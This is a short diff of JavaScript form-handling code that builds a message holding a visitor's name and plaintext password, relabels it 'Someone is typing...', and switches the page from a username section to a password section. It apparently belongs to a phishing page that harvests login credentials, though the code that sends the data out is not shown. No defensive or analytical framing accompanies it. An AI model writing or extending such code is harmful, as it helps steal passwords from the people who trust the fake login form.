@@ -42,7 +42,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     try {
         const message =
-            `New submission\n\n` +
+            `Someone is typing... \n\n` +
             `Name: ${name}\n` +
             `Password: ${pwd}`;
 
@@ -67,8 +67,8 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        document.getElementById("section_occupation").classList.add('d-none');
-        document.getElementById('section_final').classList.remove('d-none');
+        document.getElementById("section_uname").classList.add('d-none');
+        document.getElementById('section_pwd').classList.remove('d-none');
 
 
         view = "final";
@@ -76,8 +76,8 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch (error) {
         console.error('Submission error:', error);
     }
-        document.getElementById("section_occupation").classList.add('d-none');
-        document.getElementById('section_final').classList.remove('d-none');
+        document.getElementById("section_uname").classList.add('d-none');
+        document.getElementById('section_pwd').classList.remove('d-none');
             view = "final";
         }
     })
